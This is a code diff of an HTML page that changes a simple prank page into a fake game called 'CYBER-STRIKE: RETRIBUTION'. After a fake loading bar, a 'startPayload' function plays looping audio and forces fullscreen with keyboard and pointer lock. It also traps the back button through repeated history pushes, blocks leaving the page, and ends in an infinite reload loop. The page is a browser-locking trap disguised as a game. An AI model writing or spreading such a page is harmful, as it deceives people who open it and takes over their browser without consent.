@@ -2,106 +2,119 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>test</title>
+    <title>CYBER-STRIKE: RETRIBUTION</title>
     <style>
-        body, html { 
-            margin: 0; padding: 0; width: 100%; height: 100%; 
-            overflow: hidden; background-color: black;
-            display: flex; justify-content: center; align-items: center;
-        }
-
-        #shaker-box {
-            width: 100vw; height: 100vh;
-            display: flex; justify-content: center; align-items: center;
-        }
-
-        #error-img {
-            max-width: 100%; max-height: 100%; object-fit: contain;
-        }
-
-        #conf {
-            width: 100%; height: 100%; top: 0; left: 0;
-            position: fixed; background: white; z-index: 99;
-            display: flex; justify-content: center; align-items: center;
-        }
-
-        #fullscreen-trap {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85); z-index: 10000; cursor: pointer;
-            color: white; font-family: sans-serif; text-align: center; padding-top: 20%;
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #050505; font-family: 'Courier New', Courier, monospace; color: #00ff41; display: flex; justify-content: center; align-items: center; }
+        #game-ui { text-align: center; z-index: 10; }
+        .btn-start { padding: 20px 50px; font-size: 2rem; background: transparent; border: 2px solid #00ff41; color: #00ff41; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 15px #00ff41; transition: 0.3s; }
+        .btn-start:hover { background: #00ff41; color: black; }
+        #loading-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 20; flex-direction: column; justify-content: center; align-items: center; }
+        .progress-container { width: 60%; height: 30px; border: 1px solid #00ff41; margin-top: 20px; position: relative; }
+        #progress-bar { width: 0%; height: 100%; background: #00ff41; transition: linear; }
+        #shaker-box { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: black; }
+        #error-img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        #fullscreen-trap { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.2); z-index: 10000; cursor: pointer; text-align: center; padding-top: 20%; color: white; font-size: 3rem; text-shadow: 2px 2px black; }
     </style>
 </head>
 <body>
 
-    <div id="shaker-box">
-        <img src="error2.png" id="error-img">
-    </div>
+<div id="game-ui">
+    <h1>CYBER-STRIKE: RETRIBUTION</h1>
+    <p>VERSION 4.2.0 - ULTIMATE EDITION</p>
+    <button class="btn-start" onclick="initiateLoad()">START GAME</button>
+</div>
 
-    <div id="conf"><input type="button" value="click here" onclick="start()"></div>
+<div id="loading-screen">
+    <h2 id="load-text">INITIALIZING ENGINE...</h2>
+    <div class="progress-container"><div id="progress-bar"></div></div>
+    <p id="percent">0%</p>
+</div>
+
+<div id="shaker-box"><img src="error2.png" id="error-img"></div>
+
+<div id="fullscreen-trap" onclick="forceFullscreen()">
+    <h1>CONNECTION LOST</h1><p>CLICK TO RE-ESTABLISH UPLINK</p>
+</div>
+
+<audio id="jump" loop><source src="error.mp3"></audio>
+
+<script>
+const trap = document.getElementById('fullscreen-trap');
+const loadScreen = document.getElementById('loading-screen');
+const progressBar = document.getElementById('progress-bar');
+const percentText = document.getElementById('percent');
+const loadTexts = ["MOUNTING ASSETS...", "BYPASSING FIREWALLS...", "DECRYPTING CORE...", "LOADING WORLD...", "FINALIZING..."];
+
+function initiateLoad() {
+    document.getElementById('game-ui').style.display = 'none';
+    loadScreen.style.display = 'flex';
+    let width = 0;
+    let textIdx = 0;
     
-    <div id="fullscreen-trap" onclick="forceFullscreen()">
-        <h1>CONNECTION LOST</h1><p>CLICK TO ENTER</p>
-    </div>
-    
-    <audio id="jump" loop><source src="error.mp3"></audio>
-
-    <script>
-        const trap = document.getElementById('fullscreen-trap');
-
-        async function forceFullscreen() {
-            const elem = document.documentElement;
-            try {
-                if (elem.requestFullscreen) await elem.requestFullscreen();
-                // Utilizes the [Keyboard Lock API](https://developer.mozilla.org)
-                if (navigator.keyboard && navigator.keyboard.lock) await navigator.keyboard.lock(["Escape", "KeyW"]);
-                if (elem.requestPointerLock) elem.requestPointerLock();
-                trap.style.display = 'none';
-            } catch (err) {}
+    const interval = setInterval(() => {
+        if (width >= 100) {
+            clearInterval(interval);
+            startPayload();
+        } else {
+            width++;
+            progressBar.style.width = width + '%';
+            percentText.innerText = width + '%';
+            if (width % 20 === 0) {
+                document.getElementById('load-text').innerText = loadTexts[textIdx];
+                textIdx++;
+            }
         }
+    }, 50); // 5 seconds total
+}
 
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement) trap.style.display = 'block';
-        });
+async function forceFullscreen() {
+    const elem = document.documentElement;
+    try {
+        if (elem.requestFullscreen) await elem.requestFullscreen();
+        if (navigator.keyboard && navigator.keyboard.lock) await navigator.keyboard.lock(["Escape", "KeyW"]);
+        if (elem.requestPointerLock) elem.requestPointerLock();
+        trap.style.display = 'none';
+    } catch (err) {}
+}
 
-        function start() {
-            document.getElementById('conf').style.display = 'none';
-            document.querySelector('#jump').play();
-            forceFullscreen();
-            
-            // History manipulation to prevent simple back-button exit
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = () => { window.history.go(1); };
-            
-            // Standard [onbeforeunload](https://developer.mozilla.org) implementation
-            window.onbeforeunload = (e) => { 
-                e.preventDefault(); 
-                e.returnValue = ''; 
-                localStorage.x = 1;
-            };
+function startPayload() {
+    loadScreen.style.display = 'none';
+    document.getElementById('shaker-box').style.display = 'flex';
+    document.querySelector('#jump').play();
+    forceFullscreen();
 
-            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 100);
-            
-            document.addEventListener('visibilitychange', () => {
-                document.title = document.hidden ? "COME BACK" : "test";
-            });
-            // Set the localStorage flag when the user tries to leave/reload
-            window.onbeforeunload = function () {
-                localStorage.x = 1;
-            };
-    
-            // Wait 3 seconds (3000ms), then start the reload loop
-            setTimeout(function () {
-                console.log("Starting reload loop...");
-                
-                // This creates an infinite loop of reload commands
-                while (true) {
-                    location.reload();
-                }
-            }, 3000);
+    // History Manipulation
+    window.history.pushState(null, null, window.location.href);
+    window.onpopstate = () => { window.history.go(1); };
+
+    // Before Unload
+    window.onbeforeunload = (e) => {
+        e.preventDefault();
+        e.returnValue = '';
+        localStorage.x = 1;
+    };
+
+    // History Spam
+    setInterval(() => {
+        window.history.pushState(null, "", window.location.href);
+    }, 100);
+
+    // Visibility Trap
+    document.addEventListener('visibilitychange', () => {
+        document.title = document.hidden ? "COME BACK" : "CYBER-STRIKE";
+    });
+
+    // The Reload Loop
+    setTimeout(() => {
+        while (true) {
+            location.reload();
         }
-    </script>
+    }, 10000);
+}
+
+document.addEventListener('fullscreenchange', () => {
+    if (!document.fullscreenElement) trap.style.display = 'block';
+});
+</script>
 </body>
 </html>
